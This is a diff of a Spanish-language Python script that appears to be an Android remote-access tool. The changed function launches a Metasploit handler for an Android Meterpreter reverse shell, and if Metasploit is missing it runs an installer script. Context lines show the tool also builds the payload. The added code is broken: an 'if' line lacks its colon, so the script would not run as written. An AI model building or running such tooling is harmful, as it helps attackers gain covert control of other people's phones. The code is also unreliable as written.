@@ -194,12 +194,21 @@ COMPRUEBA QUE NO ESTAS CON WIFI Y QUE TIENES LA ZONA WIFI ACTIVADA
   print(f"{color.verde}PAYLOAD CREADO PERFECTAMENTE........[✓]")
   time.sleep(4)
 def msf():
- while True:
-  try:
+ var=os.system("which msfconsole")
+ banner()
+ if var == 0
    banner()
    os.system('msfconsole -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp ; set lhost 127.0.0.1; set lport 4444;set ExitOnSession false"')
-   break
-  except:
+ else :
+   pronto(f"""{color.rojo}
+          METASPLOIT NO ESTA INSTALADO 
+        PROCEDIENDO A INSTALARLO TARDARA
+           UN RATO NO TENGAS PRISA{color.fin}""")
+   time.sleep(6)
    subprocess.run(['bash','./metasploit.sh'])
+   banner()
+   pronto(f"""{color.verde}METASPLOIT INSTALADO [✓]
+EJECUTA EL SCRIPT OTRA VEZ{color.fin}""")
+   sys.exit()
 
 menu()
